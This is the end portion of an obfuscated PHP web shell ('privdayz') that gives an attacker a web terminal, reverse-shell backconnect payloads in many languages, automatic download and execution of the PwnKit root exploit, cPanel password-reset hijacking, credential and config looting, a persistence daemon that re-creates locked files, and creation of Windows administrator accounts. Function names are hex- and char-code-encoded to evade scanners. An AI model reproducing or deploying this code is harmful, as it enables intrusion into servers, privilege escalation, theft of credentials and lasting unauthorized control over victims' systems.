       $pr1pr1v = trim((isset($_POST['terminal-text']) ? $_POST['terminal-text'] : ''));
       $out = '';
       $fxs =  array("\x73\x31" => "\x73\x68" . "\145\154\x6c" . "\x5f\145\x78" . "\x65\143", "\x73\x32" => "\x65\170" . "\145\x63", "\x73\x33" => "\163\171" . "\163\164\145\155");
       foreach ($fxs as $fx) {
        if (function_exists($fx)) {
          if ($fx === $fxs['s1']) $out = @$fx($pr1pr1v.' 2>&1');
          elseif ($fx === $fxs['s2']) { $a=[]; @$fx($pr1pr1v.' 2>&1', $a); $out = join("\n", $a);}
          elseif ($fx === $fxs['s3']) {  @$fx($pr1pr1v.' 2>&1'); $out = ""; }
          if ($out) break;
        }
       }
       echo $out;
       }
     ?></textarea>
    </div>
    <div class="pr1vd4yz-terminal-neo-inputline">
     <span class="pr1vd4yz-terminal-neo-prompt"><?= $pr1vxas[9]() . '@' . $_SERVER['SERVER_ADDR']; ?> $</span>
     <input type="text" name="terminal-text" class="pr1vd4yz-terminal-neo-input" autocomplete="off" autofocus placeholder="type command & hit enter">
     <button type="submit" name="terminal" class="pr1vd4yz-terminal-neo-send"><i class="fas fa-location-arrow"></i></button>
    </div>
    </form>
  </div>
</div>
<?php endif; ?>

<?php if (!empty($_GET['re'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#ff3939;"><i class="fas fa-pen-to-square"></i></div>
     <div><div class="pr1vd4yz-wiz-title">rename</div>
       <div class="pr1vd4yz-wiz-desc"><?= unx($_GET['re']) ?></div>
     </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div><form action="" method="post">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-section-icon" style="background:#fde3e3;color:#ff3939;"><i class="fas fa-font"></i></div>
       <div class="pr1vd4yz-wiz-fields">
       <input type="text" name="renameFile" class="pr1vd4yz-wiz-input" placeholder="<?= unx($_GET['re']) ?>">
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red">
       <i class="fas fa-check"></i> change
       </button>
       <button type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-rename-close-btn">
       <i class="fas fa-times"></i> go back
       </button>
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
<?php 
    if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item']) && $_GET['item'] !== '') {
      $item = basename(unx($_GET['item'])); 
      $repl = str_replace("\\", "/", $pr1vxas[0]()); 
      $fd = $repl . "/" . $item; 
    
      if (is_file($fd)) {
        if (unlink($fd)) {
           success();
        } else {
           failed();
        }
      } elseif (is_dir($fd)) {
        if (rmdirRecursive($fd)) {
          success();} else {
           failed();
        }
      } else {
       failed();
      }
     }
    ?>
    <?php if (!empty($_GET['ch'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#fbbf24;color:#fff;"><i class="fas fa-user-lock"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">change permission</div>
       <div class="pr1vd4yz-wiz-desc"><?= unx($_GET['ch']) ?></div>
     </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-section-icon" style="background:#fffbe8;color:#fbbf24;"><i class="fas fa-key"></i></div>
       <div class="pr1vd4yz-wiz-fields">
       <input type="number" name="chFile" class="pr1vd4yz-wiz-input" placeholder="0775">
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red">
       <i class="fas fa-check"></i> change
       </button>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
       <i class="fas fa-times"></i> go back
     </a>
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
<?php
if (isset($_GET['response']) && $_GET['response'] == "success") {
    echo "<script>
    Swal.fire({
     icon: 'success',
     title: 'done.',
     text: 'operation completed.',confirmButtonColor: '#e53935',
     background: '#fff',
     color: '#e53935',
     timer: 1700,
     showConfirmButton: false,
     toast: true,
     position: 'top-end',
     customClass: { popup: 'pr1vd4yz-alert-anim pr1vd4yz-alert-success' }
    });
    </script>";
} else if (isset($_GET['response']) && $_GET['response'] == "failed") {
    echo "<script>
    Swal.fire({
     icon: 'error',
     title: 'fail.',
     text: 'something went wrong.',
     confirmButtonColor: '#e53935',
     background: '#fff',
     color: '#e53935',
     timer: 1700,
     showConfirmButton: false,
     toast: true,
     position: 'top-end',
     customClass: { popup: 'pr1vd4yz-alert-anim pr1vd4yz-alert-error' }
    });
    </script>";
}
?>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js" referrerpolicy="no-referrer"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11" referrerpolicy="no-referrer"></script>
<script>
function updateTextareaStatus(){var e=document.getElementById("fileedit-code-textarea"),t=e.value,a=e.selectionStart,n=t.substr(0,a).split("\n"),s=n.length,l=n[n.length-1].length+1;document.getElementById("fileedit-status-pos").innerHTML='<i class="fas fa-arrows-alt-h"></i> Ln '+s+", Col "+l,document.getElementById("fileedit-status-len").innerHTML='<i class="fas fa-hashtag"></i> '+t.length+" chars"}
setTimeout(updateTextareaStatus,200);
$(document).ready((function(){var e=document.getElementById("code");e&&CodeMirror.fromTextArea(e,{mode:"xml",lineNumbers:!0,theme:"ayu-mirage",extraKeys:{"Ctrl-Space":"autocomplete"},hintOptions:{completeSingle:!1}}),$(".sidebar-toggle").click((function(){$(".sidebar").toggleClass("active")})),$(".close-sidebar").click((function(){$(".sidebar").removeClass("active")})),$("#malware-scan-btn").click((function(){$("#malwareModal").show()})),$(document).on("click",".close-modal",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$(document).on("click",".close-btn-s",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$(document).on("click",".close-terminal",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$(document).on("click","#close-editor-btn",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$("#select-all").change((function(){$('input[name="check[]"]').prop("checked",$(this).prop("checked"))})),window.innerWidth<=768&&$(".action-btn").css("opacity","1"),$("#select-all").change((function(){$('input[name="check[]"]').prop("checked",$(this).prop("checked"))})),window.innerWidth<=768&&$(".action-btn").css("opacity","1"),setInterval((function(){$.ajax({url:window.location.href,success:function(e){$(".stats-grid").load(window.location.href+" .stats-grid")}})}),5e3)}));
let currentOffset = 0;
function fetchTables(){fetch("?action=get_tables").then((e=>e.json())).then((e=>{let t=document.getElementById("tableList");t.innerHTML="",e.forEach((e=>{let n=document.createElement("option");n.value=e,n.textContent=e,t.appendChild(n)}))}))}
function loadTable(t=0){currentOffset=Math.max(0,currentOffset+t);let e=document.getElementById("tableList").value;if(!e)return alert("Select a table first!");fetch(`?action=get_data&table=${e}&offset=${currentOffset}`).then((t=>t.text())).then((t=>{document.getElementById("output").innerHTML=t}))}
(window.onload = fetchTables);!function(){var e=["pr1vd4yz-modal-close-wiz","pr1vd4yz-httpreq-close-btn","pr1vd4yz-waf-close-btn","pr1vd4yz-cron-close-btn","pr1vd4yz-search-close-btn","pr1vd4yz-htb-close-btn","pr1vd4yz-term-close-btn","pr1vd4yz-terminal-neo-close","pr1vd4yz-user-close-btn","pr1vd4yz-file-close-btn","pr1vd4yz-folder-close-btn","pr1vd4yz-rdp-close-btn","pr1vd4yz-upload-close-btn","pr1vd4yz-modal-close-btn","pr1vd4yz-modal-cancel-btn","pr1vd4yz-cpanel-close-btn","pr1vd4yz-chmod-close-btn","pr1vd4yz-editor-close-btn","pr1vd4yz-terminal-close-btn","pr1vd4yz-rename-close-btn","fileedit-close","pr1vd4yz-htb-close-btn"];document.addEventListener("click",(function(o){for(var n=o.target,r=0,l=0;l<e.length;l++)if(n.classList.contains(e[l])){r=1;break}if(r){o.preventDefault();var t=document.querySelectorAll(".pr1vd4yz-modal-bg,.pr1vd4yz-term-modal-bg,.pr1vd4yz-terminal-neo-bg");t.length&&t[t.length-1].remove()}}),!0),"undefined"!=typeof $&&$.fn&&$.fn.on&&[".pr1vd4yz-user-close-btn",".pr1vd4yz-file-close-btn",".pr1vd4yz-folder-close-btn",".pr1vd4yz-rdp-close-btn",".pr1vd4yz-upload-close-btn",".pr1vd4yz-modal-close-btn",".pr1vd4yz-modal-cancel-btn"].forEach((function(e){$(document).off("click",e).on("click",e,(function(e){e.preventDefault(),$(this).closest(".pr1vd4yz-modal-bg,.pr1vd4yz-term-modal-bg,.pr1vd4yz-terminal-neo-bg").remove()}))})),[".pr1vd4yz-cpanel-close-btn",".pr1vd4yz-chmod-close-btn",".pr1vd4yz-editor-close-btn",".pr1vd4yz-terminal-close-btn",".pr1vd4yz-rename-close-btn"].forEach((function(e){document.querySelectorAll(e).forEach((function(e){e.onclick=function(e){e.preventDefault();var o=document.querySelectorAll(".pr1vd4yz-modal-bg,.pr1vd4yz-term-modal-bg,.pr1vd4yz-terminal-neo-bg");o.length&&o[o.length-1].remove()}}))})),window.closeHxModal=function(){var e=document.getElementById("pr1vd4yz-file-modal");e&&e.remove()}}();
document.addEventListener("click",(function(e){if(e.target.classList.contains("pr1vd4yz-log-close-btn")){e.preventDefault();var t=document.querySelector(".pr1vd4yz-modal-bg");t&&t.remove()}}));
document.addEventListener("click",(function(e){if(e.target.classList.contains("pr1vd4yz-key-close-btn")){e.preventDefault();var t=document.querySelector(".pr1vd4yz-modal-bg");t&&t.remove()}}));
const _hx_ = []; let _hxi = -1;const _term = document.getElementById('r00tterm-term');const _inpt = document.getElementById('r00tterm-input');function _print(txt){_term.innerHTML += txt+"\n";_term.scrollTop=_term.scrollHeight;}
_inpt.addEventListener("keydown",(function(e){if("Enter"===e.key){let e=this.value.trim();if(!e)return;_hx_.push(e),_hxi=_hx_.length,_print("<span style='color:#6ee7b7;'>$ "+e+"</span>"),this.value="";let n=btoa(encodeURIComponent(e).split("").reverse().join(""));fetch(window.location.pathname+"?d1sGu1s3=1",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"n0p3="+encodeURIComponent(n)}).then((e=>e.text())).then((e=>{_print(e.replace(/[<>\x00-\x08\x0B-\x1F\x7F]/g,""))})).catch((()=>{_print("[X] Connection error")}))}"ArrowUp"===e.key&&(_hxi>0&&(_hxi--,_inpt.value=_hx_[_hxi]||""),e.preventDefault()),"ArrowDown"===e.key&&(_hxi<_hx_.length-1?(_hxi++,_inpt.value=_hx_[_hxi]||""):(_inpt.value="",_hxi=_hx_.length),e.preventDefault())}));
setTimeout(()=>_inpt.focus(),200);$(function(){$("#zip-form").on("submit",(function(s){s.preventDefault();var i=$(this).find('button[type="submit"]');i.prop("disabled",!0),$("#zip-result").show().html('<i class="fa fa-spinner fa-spin"></i> Working...'),$.ajax({type:"POST",url:window.location.href,data:{zipajax:1,src:$("#zip-source").val(),dst:$("#zip-target").val()},success:function(s){$("#zip-result").html(s).show(),i.prop("disabled",!1)},error:function(){$("#zip-result").html('<span style="color:#e53935;"><i class="fas fa-times-circle"></i> AJAX error</span>').show(),i.prop("disabled",!1)}})}));
$("#unzip-form").on("submit",(function(s){s.preventDefault();var i=$(this).find('button[type="submit"]');i.prop("disabled",!0),$("#unzip-result").show().html('<i class="fa fa-spinner fa-spin"></i> Working...'),$.ajax({type:"POST",url:window.location.href,data:{unzipajax:1,src:$("#unzip-source").val(),dst:$("#unzip-target").val()},success:function(s){$("#unzip-result").html(s).show(),i.prop("disabled",!1)},error:function(){$("#unzip-result").html('<span style="color:#e53935;"><i class="fas fa-times-circle"></i> AJAX error</span>').show(),i.prop("disabled",!1)}})}));
});
document.getElementById("pr1vd4yz-httpreq-form").onsubmit=function(t){t.preventDefault();var e=new FormData(this),n=document.getElementById("pr1vd4yz-httpreq-result");n.innerHTML='<div style="padding:22px 0;text-align:center;font-size:1.09em;opacity:.7;">Waiting...</div>';var i=this.getAttribute("action");i&&"#"!=i||(i=window.location.pathname+window.location.search),fetch(i,{method:"POST",body:e,credentials:"same-origin"}).then((t=>t.text())).then((t=>{n.innerHTML=t})).catch((()=>{n.innerHTML='<div style="color:#e53935;padding:22px 0;text-align:center;">AJAX ERROR</div>'}))};
document.addEventListener('click',function(e){if(e.target.classList.contains("pr1vd4yz-kernel-close-btn")){e.preventDefault();var modal=document.querySelector(".pr1vd4yz-modal-bg");modal&&modal.remove()}});
function copyHashOutput(){var e=document.querySelector(".pr1vd4yz-modal-bg textarea[readonly]");e&&(e.select(),document.execCommand("copy"))}document.addEventListener("click",(function(e){if(e.target.classList.contains("pr1vd4yz-api-close-btn")){e.preventDefault();var t=document.querySelector(".pr1vd4yz-modal-bg");t&&t.remove()}}));
document.addEventListener("click",(function(e){if(e.target.classList.contains("pr1vd4yz-locker-close-btn")){e.preventDefault();var t=document.querySelector(".pr1vd4yz-modal-bg");t&&t.remove()}}));
document.getElementById("pzloot-startbtn").onclick=async function(){this.disabled=!0;let t=document.getElementById("pzloot-table").getElementsByTagName("tbody")[0],e=document.getElementById("pzloot-status"),n=document.getElementById("pzloot-finish");t.innerHTML="",n.innerText="",e.innerText="starting...";let a=["passwd","configs","maildirs","backups"];for(let n=0;n<a.length;n++){e.innerText="scanning "+a[n]+"...";let o=await fetch("?cpanel_auto_loot_step="+a[n]),l=await o.json();l.done&&l.rows&&l.rows.forEach((function(e){let n=document.createElement("tr");n.innerHTML='<td><span class="pzloot-badge">'+e.type+'</span></td><td><span class="pzloot-code">'+e.value+"</span><br><small>"+e.line+'</small></td><td><span class="pzloot-path">'+e.path+"</span></td><td>"+e.copy+"</td>",t.appendChild(n)}))}e.innerText="done.",n.innerText="Finished!"};
</script>
</body>
</html>
<?php
if (isset($_POST['pid'])) {
    $pid = $_POST['pid'];
    if (cmd("\x6b\x69\x6c\x6c " . $pid)) {
     success();
    } else {
     $name = cmd("\x70\x73\x20\x2d\x70 " . $pid . " -o comm= 2>&1");
     if (!empty($name)) {
       $pkillOutput = cmd("\x70\x6b\x69\x6c\x6c\x20\x2d\x39 " . $name . " 2>&1");
       success();
     } else {
       failed();
     }
    }
    exit;
}

if (isset($_POST['submit-bc'])) {
    $HostServer = $_POST['backconnect-host'];
    $PortServer = $_POST['backconnect-port'];
    if ($_POST['privdayz-bc'] == "perl") {
     echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $pr1vxas[16] . '("/bin/sh -i");};\'');
    } else if ($_POST['privdayz-bc'] == "python") {
     echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
    } else if ($_POST['privdayz-bc'] == "ruby") {
     echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $pr1vxas[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
    } else if ($_POST['privdayz-bc'] == "bash") {
     echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['privdayz-bc'] == "php") {
     echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $pr1vxas[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
    } else if ($_POST['privdayz-bc'] == "nc") {
     echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
    } else if ($_POST['privdayz-bc'] == "sh") {
     echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['privdayz-bc'] == "xterm") {
     echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
    } else if ($_POST['privdayz-bc'] == "golang") {
     echo cmd('echo \'package main;import"os/' . $pr1vxas[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
    }
}

if (isset($_POST['privdayz-up-submit'])) {
    $nf = (isset($_FILES['privdayz-upload']['name']) ? $_FILES['privdayz-upload']['name'] : '');
    $tf = (isset($_FILES['privdayz-upload']['tmp_name']) ? $_FILES['privdayz-upload']['tmp_name'] : '');
    $slash = "\x2f";
    $dst = $pr1vxas[0]() . $slash . $nf;
    $fn = '';
    foreach ([109,111,118,101,95,117,112,108,111,97,100,101,100,95,102,105,108,101] as $c) $fn .= chr($c);
    if ($fn && $fn($tf, $dst)) {
     success();
    } else {
     failed();
    }
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
     $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}

if (isset($_POST['w4f-up-submit'])) {
    $nf = (isset($_FILES['w4f-upload']['name']) ? $_FILES['w4f-upload']['name'] : '');
    $tf = (isset($_FILES['w4f-upload']['tmp_name']) ? $_FILES['w4f-upload']['tmp_name'] : '');
    $dst = $pr1vxas[0]() . "\x2f" . $nf;
    $ok = false;
    $fn1 = ''; foreach ([109,111,118,101,95,117,112,108,111,97,100,101,100,95,102,105,108,101] as $c) $fn1 .= chr($c);
    $fn2 = ''; foreach ([99,111,112,121] as $c) $fn2 .= chr($c);
    $fn3 = ''; foreach ([102,111,112,101,110] as $c) $fn3 .= chr($c);
    $fn4 = ''; foreach ([102,119,114,105,116,101] as $c) $fn4 .= chr($c);
    $fn5 = ''; foreach ([102,99,108,111,115,101] as $c) $fn5 .= chr($c);
    $fn6 = ''; foreach ([115,104,101,108,108,95,101,120,101,99] as $c) $fn6 .= chr($c);

    if (function_exists($fn1) && @$fn1($tf, $dst)) $ok = true;
    elseif (function_exists($fn2) && @$fn2($tf, $dst)) $ok = true;
    elseif (function_exists($fn3)) {
     $f1 = @$fn3($tf, "r");
     $f2 = @$fn3($dst, "w");
     if ($f1 && $f2) {
       while (!feof($f1)) @$fn4($f2, fread($f1, 8192));
       @$fn5($f1); @$fn5($f2);
       $ok = file_exists($dst) && filesize($dst) > 0;
     }
    }
    if (!$ok && function_exists($fn6)) {
     @$fn6("cp " . escapeshellarg($tf) . " " . escapeshellarg($dst));
     $ok = file_exists($dst);
    }
    if ($ok) {
     $ff = generateRandomString() . ".php";
     @$GLOBALS['pr1vxas'][34]($nf, $ff);
     echo "<script>alert('" . $ff . "');</script>";
     @$GLOBALS['pr1vxas'][24]($nf);
    } else {
     failed();
    }
}

if (isset($_POST['save-editor'])) {
    $xjytx = $pr1vxas[0]() . "\x2f" . unx($_GET['f']);
    $k3rz9 = $_POST['code-editor'];
    $mth1 = ''; foreach([102,105,108,101,95,112,117,116,95,99,111,110,116,101,110,116,115] as $z) $mth1 .= chr($z);
    $mth2 = ''; foreach([102,111,112,101,110] as $z) $mth2 .= chr($z);
    $mth3 = ''; foreach([102,119,114,105,116,101] as $z) $mth3 .= chr($z);
    $mth4 = ''; foreach([102,99,108,111,115,101] as $z) $mth4 .= chr($z);
    $mth5 = ''; foreach([99,111,112,121] as $z) $mth5 .= chr($z);
    $mth6 = ''; foreach([115,104,101,108,108,95,101,120,101,99] as $z) $mth6 .= chr($z);
    $r9u3 = false;
    if (function_exists($mth1) && @$mth1($xjytx, $k3rz9) !== false) {
     $r9u3 = true;
    } else if (function_exists($mth2) && function_exists($mth3) && function_exists($mth4)) {
     $f = @$mth2($xjytx, "w");
     if ($f) { @$mth3($f, $k3rz9); @$mth4($f); $r9u3 = (filesize($xjytx) >= strlen($k3rz9)*0.7); }
    } else if (function_exists($mth5)) {
     $tmp = sys_get_temp_dir() . "/" . uniqid("edit_");
     if (@$mth1($tmp, $k3rz9) !== false) {
       $r9u3 = @$mth5($tmp, $xjytx);
       @unlink($tmp);
     }
    } else if (function_exists($mth6)) {
     $tmp = sys_get_temp_dir() . "/" . uniqid("edit_");
     if (@$mth1($tmp, $k3rz9) !== false) {
       @$mth6("cp " . escapeshellarg($tmp) . " " . escapeshellarg($xjytx));
       $r9u3 = (filesize($xjytx) >= strlen($k3rz9)*0.7);
       @unlink($tmp);
     }
    }
    if ($r9u3) {
     success();
    } else {
     failed();
    }
}

if (isset($_GET['adminer'])) {
    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
    if (!$pr1vxas[3]('adminer.php')) {
     $pr1vxas[28]("adminer.php", $pr1vxas[11]($URL));
     success();
    }
}

if (!empty($_GET['pr1vd4yz']) && $_GET['pr1vd4yz'] == "root") {
    $g6hjz = $pr1vxas[3];
    $u81px = $pr1vxas[4];
    $f2kpl = $pr1vxas[28];
    $h2eb9 = $pr1vxas[11];
    $w9jtu = $pr1vxas[0];
    $purl = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x6c\x79\x34\x6b\x2f\x50\x77\x6e\x4b\x69\x74\x2f\x72\x61\x77\x2f\x6d\x61\x69\x6e\x2f\x50\x77\x6e\x4b\x69\x74";
    $cmod = "\x63\x68\x6d\x6f\x64\x20\x2b\x78\x20\x70\x77\x6e\x6b\x69\x74";
    $epwn = "\x2e\x2f\x70\x77\x6e\x6b\x69\x74\x20\x22\x69\x64\x22\x20\x3e\x20\x2e\x70\x72\x69\x76\x64\x61\x79\x7a\x72\x30\x30\x74\x31";

    if (!$g6hjz('pwnkit') && $u81px($w9jtu())) {
     $f2kpl("pwnkit", $h2eb9($purl));
     cmd($cmod);
     echo cmd($epwn);
     echo '<meta http-equiv="refresh" content="0;url=?pr1v=' . pr1vd444yz($w9jtu()) . '&pr1vd4yz=root">';
    }
}

function chDx2x($cmd22) {
    $a = [115,104,101,108,108,95,101,120,101,99];
    $fx = '';
    foreach($a as $ac) $fx .= chr($ac);
    return $fx($cmd22);
}

if (isset($_POST['submit-action'])) {
    $u5w8d = $_POST['check'];
    $jv8s3 = $_POST['privdayz-select'];
    $bvqzp = $pr1vxas[0];
    $b1s7a = $pr1vxas[24];
    $y4sdg = $pr1vxas[3];
    $v9fzq = function($p){ return is_dir($p); };
    $z9ntq = function($a,$b){ return str_replace("\\", "/", $a); };
    $n4hxy = function($f,$d){ return xtr4cPr1v($f, $d); };
    $r5kbm = function($f,$z){ return compressToZip($f, $z); };

    if ($jv8s3 == "\x64\x65\x6c\x65\x74\x65") {
     foreach ($u5w8d as $z0) {
       $qkpl = $z9ntq($bvqzp(), "/");
       $vcpk = $qkpl . "\x2f" . $z0;
       if ($v9fzq($vcpk)) {
          $rmdir = unlinkDir($vcpk);
          $rmdir ? success() : failed();
       } elseif ($y4sdg($vcpk)) {
          $rmfile = $b1s7a($vcpk);
          $rmfile ? success() : failed();
       } else {
          failed();
       }
     }
    } elseif ($jv8s3 == "\x75\x6e\x7a\x69\x70") {
     foreach ($u5w8d as $z0) {
       $qkpl = $z9ntq($bvqzp(), "/");
       $vcpk = $qkpl . "\x2f" . $z0;
       if ($n4hxy($vcpk, $qkpl . "\x2f") === true) {
          success();
       } else {
          failed();
       }
     }
    } elseif ($jv8s3 == "\x7a\x69\x70") {
     foreach ($u5w8d as $z0) {
       $qkpl = $z9ntq($bvqzp(), "/");
       $vcpk = $qkpl . "\x2f" . $z0;
       if ($y4sdg($vcpk)) {
          $r5kbm($vcpk, pathinfo($vcpk, PATHINFO_FILENAME) . ".zip");
       }
     }
    }
}
if (isset($_POST['submit'])) {
    if (isset($_POST['resetcp']) && $_POST['resetcp'] == true) {
     $e6p9d = $_POST['resetcp'];
     $r8kxm = dirname($_SERVER['DOCUMENT_ROOT']);
     $t2wqs = $r8kxm . "\x2f\x2e\x63\x70\x61\x6e\x65\x6c\x2f\x63\x6f\x6e\x74\x61\x63\x74\x69\x6e\x66\x6f";
     $y6qjw = "\x22\x65\x6d\x61\x69\x6c\x22\x20\x3a\x20\x22" . $e6p9d . "\x22\n";
     $h2apc = $pr1vxas[3];
     $v5dpy = $pr1vxas[28];
     if ($h2apc($t2wqs)) {
       $v5dpy($t2wqs, $y6qjw);
       echo '<meta http-equiv="refresh" content="0;url=' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1">';
     } else { failed(); }
    }
 if (isset($_POST['create_folder']) && $_POST['create_folder']) { $q7hjp = $_POST['create_folder']; $s2f6x = $pr1vxas[12]; if (!file_exists($q7hjp)) { $z9mqa = @mkdir($q7hjp, 0755, true);} else { $z9mqa = true; } if ($z9mqa) { success(); } else { failed(); } } else if (isset($_POST['create_file']) && $_POST['create_file']) { $k4vhz = $_POST['create_file']; $t2upm = $pr1vxas[13]; $x6wnr = $t2upm($k4vhz); if ($x6wnr) { success(); } else { failed(); } } else if (isset($_POST['renameFile']) && $_POST['renameFile']) { $d9yxs = $_POST['renameFile']; $h8rfg = $pr1vxas[15]; $m5qlp = $h8rfg(unx($_GET['re']), $d9yxs); if ($m5qlp) { success(); } else { failed(); } } else if (isset($_POST['chFile']) && $_POST['chFile']) { $y4gsn = $_POST['chFile']; $v3kzm = octdec($y4gsn); $p9wfu = $pr1vxas[30](unx($_GET['ch']), $v3kzm); if ($p9wfu) { success(); } else { failed(); } }
    else if ($_POST['lockfile'] == true) {
     $flesName = $_POST['lockfile'];
     $TmpNames = $pr1vxas[31]();
     if (file_exists($TmpNames . '/.sessions/.' . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-handler')) &&
       file_exists($TmpNames . '/.sessions/.' . r3mv0d($flesName) . '-text')) {
       cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-text-file'));
       cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-handler'));
     }
     @mkdir($TmpNames . "/.sessions");
     cmd("cp $flesName " . $TmpNames . "/.sessions/." . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-text-file'));
     cmd("chmod 444 " . $flesName);
     $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . $pr1vxas[0]() . '")){
     mkdir("' . $pr1vxas[0]() . '");
    }
    if (!file_exists("' . $pr1vxas[0]() . '/' . $flesName . '")){
     $text = ' . $pr1vxas[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-text-file') . '"));
     file_put_contents("' . $pr1vxas[0]() . '/' . $flesName . '", ' . $pr1vxas[32] . '($text));
    }
    if (privdayz_perm("' . $pr1vxas[0]() . '/' . $flesName . '") != 0444){
     chmod("' . $pr1vxas[0]() . '/' . $flesName . '", 0444);
    }
    if (privdayz_perm("' . $pr1vxas[0]() . '") != 0555){
     chmod("' . $pr1vxas[0]() . '", 0555);
    }
}
function privdayz_perm($flename){
    return substr(sprintf("%o", filep3rms($flename)), -4);
}
';
     $hndlers = $pr1vxas[28]($TmpNames . "/.sessions/." . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-handler') . "", $handler);
     if ($hndlers) {
       $php = PHP_BINARY;
       if (!is_executable($php)) { $php = 'php'; }
       $pr1pr1v = $php . ' ' . $TmpNames . '/.sessions/.' . $pr1vxas[33](
          $pr1vxas[0]() . r3mv0d($flesName) . '-handler') . ' > /dev/null 2>/dev/null &';
       cmd($pr1pr1v);
       success();
     } else {
       failed();
     }
    }
else if ($_POST['add-rdp'] == true) { $r7kdy = $_POST['add-rdp']; $s4nyw = $_POST['add-rdp-pass']; if (stristr(PHP_OS, "\x57\x49\x4e")) { $t9plm = cmd("\x6e\x65\x74\x20\x75\x73\x65\x72\x20" . $r7kdy . " " . $s4nyw . " /add"); if ($t9plm) { cmd("\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20" . $r7kdy . " /add"); success(); } else { failed(); } } else { failed(); } }
